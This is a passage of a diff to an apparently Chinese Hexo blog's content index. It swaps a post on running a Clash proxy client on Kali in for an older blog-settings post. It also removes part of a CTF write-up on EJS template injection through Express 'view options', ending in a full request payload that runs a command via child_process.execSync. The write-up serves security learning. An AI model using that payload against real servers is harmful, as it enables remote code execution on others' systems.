-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var _OPTS_PASSABLE_WITH_DATA = [&#x27;delimiter&#x27;, &#x27;scope&#x27;, &#x27;context&#x27;, &#x27;debug&#x27;, &#x27;compileDebug&#x27;,</span><br><span class="line">  &#x27;client&#x27;, &#x27;_with&#x27;, &#x27;rmWhitespace&#x27;, &#x27;strict&#x27;, &#x27;filename&#x27;, &#x27;async&#x27;];</span><br><span class="line">// We don&#x27;t allow &#x27;cache&#x27; option to be passed in the data obj for</span><br><span class="line">// the normal `render` call, but this is where Express 2 &amp; 3 put it</span><br><span class="line">// so we make an exception for `renderFile`</span><br><span class="line">var _OPTS_PASSABLE_WITH_DATA_EXPRESS = _OPTS_PASSABLE_WITH_DATA.concat(&#x27;cache&#x27;);</span><br></pre></td></tr></table></figure>
+<h2 id="设置标题"><a href="#设置标题" class="headerlink" title="设置标题"></a>设置标题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Clicker-HackTheBox</span><br><span class="line">tags:</span><br><span class="line">  - 提权</span><br><span class="line">categories:</span><br><span class="line">  - HTB-writeup</span><br><span class="line">date: 2024-1-10</span><br><span class="line">abbrlink: 6d2044b3</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">session伪造、perl_startup提权</span><br><span class="line">&lt;!-- more --&gt;</span><br></pre></td></tr></table></figure>
 
-<p>但是我们找到<code>settings[&#39;view options&#39;]</code>可用于将任意选项传递给EJS，这将是我们利用的点</p>
-<p>跟进一下，会调用shallowCopy()进行赋值给opts</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">viewOpts = data.settings[&#x27;view options&#x27;];</span><br><span class="line">if (viewOpts) &#123;</span><br><span class="line">  utils.shallowCopy(opts, viewOpts);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>而在渲染模板的时候会跟进到Template类中，发现关键语句</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;</span><br></pre></td></tr></table></figure>
-
-<p>也就是说虽然escapeFunction被过滤了，但是我们可以利用opts.escape去替换</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">settings[&#x27;view options&#x27;][escape]=...</span><br></pre></td></tr></table></figure>
-
-<p>将前文漏洞利用的payload稍加修改一下，然后添加上greet.ejs中的三个配置参数</p>
-<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106171750370.png"></p>
-<p>得到最终payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/greet?name=test&amp;font=test&amp;fontSize=test&amp;settings[view options][escape]=function()&#123;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;/readflag&#x27;)&#125;&amp;settings[view options][client]=1</span><br></pre></td></tr></table></figure>
-
-<p>注：题目源码已经<code>JSON.stringify</code>了，<code>/readflag</code>可以在dockerfile中得到信息</p>
-<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106175700268.png"></p>
+<p><code>&lt;!-- more --&gt;</code>标签可以使文章只展示前文概要，阅读整篇文章需要点击进去</p>
 ]]></content>
       <categories>
-        <category>web安全</category>
+        <category>杂项</category>
       </categories>
-      <tags>
-        <tag>模板注入</tag>
-        <tag>原型链污染</tag>
-      </tags>
   </entry>
   <entry>
     <title>红明谷杯2024</title>
@@ -2577,28 +2601,45 @@
       </categories>
   </entry>
   <entry>
-    <title>博客常用设置</title>
-    <url>/article/%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E8%AE%BE%E7%BD%AE.html</url>
-    <content><![CDATA[<p>一些基于hexo搭建的博客的基本设置</p>
+    <title>记录kali如何挂梯子</title>
+    <url>/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90.html</url>
+    <content><![CDATA[<p>记录下kali如何挂梯子</p>
 <span id="more"></span>
 
 
 
-<h1 id="博客常用设置"><a href="#博客常用设置" class="headerlink" title="博客常用设置"></a>博客常用设置</h1><h2 id="本地部署"><a href="#本地部署" class="headerlink" title="本地部署"></a>本地部署</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+<p><strong>前言</strong></p>
+<blockquote>
+<p>网上关于Linux挂梯子的教程有挺多的，不过一开始按照参考文章都不行（搁置了好久）。现在有时间来弄结果成功了，特此记录下</p>
+</blockquote>
+<p><strong>步骤</strong></p>
+<p>我们先创建clash目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir clash</span><br></pre></td></tr></table></figure>
 
+<p>然后我们下载压缩包文件，选择第一个</p>
+<p>链接：<a href="https://archive.org/download/clash_for_windows_pkg">https://archive.org/download/clash_for_windows_pkg</a></p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425211553427.png"></p>
+<p>解压后进入目录<code>Clash for Windows-0.20.39-x64-linux</code>，试试执行下程序</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./cfw</span><br></pre></td></tr></table></figure>
 
-
-<h2 id="发表文章"><a href="#发表文章" class="headerlink" title="发表文章"></a>发表文章</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo cl &amp; hexo &amp; hexo g &amp; hexo d</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="设置标题"><a href="#设置标题" class="headerlink" title="设置标题"></a>设置标题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Clicker-HackTheBox</span><br><span class="line">tags:</span><br><span class="line">  - 提权</span><br><span class="line">categories:</span><br><span class="line">  - HTB-writeup</span><br><span class="line">date: 2024-1-10</span><br><span class="line">abbrlink: 6d2044b3</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">session伪造、perl_startup提权</span><br><span class="line">&lt;!-- more --&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>&lt;!-- more --&gt;</code>标签可以使文章只展示前文概要，阅读整篇文章需要点击进去</p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212131108.png"></p>
+<p>成功打开后，我们可以汉化一下</p>
+<p>访问<code>https://github.com/Z-Siqi/Clash-for-Windows_Chinese</code>，点击release后下载app.asar文件</p>
+<p>然后替换<code>/clash/Clash for Windows-0.20.39-x64-linux/resources/</code>目录下的同名文件，重新启动即可</p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212641961.png"></p>
+<p>然后就是导入配置文件，我这里是直接在物理机下载下来配置文件然后导入</p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212813415.png"></p>
+<p>最后就是设置浏览器代理</p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212844360.png"></p>
+<p>设置好后，就能成功使用魔法访问外网</p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212931593.png"></p>
 ]]></content>
       <categories>
-        <category>杂项</category>
+        <category>工具</category>
       </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
   </entry>
   <entry>
     <title>陇剑杯2021</title>
